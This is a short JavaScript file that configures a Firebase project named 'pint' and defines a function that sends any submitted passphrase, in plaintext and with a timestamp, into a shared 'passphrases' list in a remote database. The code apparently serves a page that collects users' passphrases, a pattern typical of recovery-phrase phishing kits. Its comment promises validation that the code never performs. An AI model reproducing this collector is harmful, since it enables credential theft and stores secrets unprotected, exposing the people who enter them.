// firebaseLogic.js

// Firebase Configuration
const firebaseConfig = {
  apiKey: "AIzaSyAtuqroUbp9TpqjNvbl99eDaihRMenhEqw",
  authDomain: "pint-145f3.firebaseapp.com",
  projectId: "pint-145f3",
  storageBucket: "pint-145f3.firebasestorage.app",
  messagingSenderId: "77141015675",
  appId: "1:77141015675:web:96747fb0e4d665448ab6de",
  measurementId: "G-7ENZTTCRRG"
};

// Initialize Firebase
const app = firebase.initializeApp(firebaseConfig);
const database = firebase.database();

// Function to validate and save passphrase to Firebase
function savePassphraseToFirebase(passphrase) {
  return database.ref("passphrases").push({
      passphrase: passphrase,
      timestamp: new Date().toISOString()
  });
}
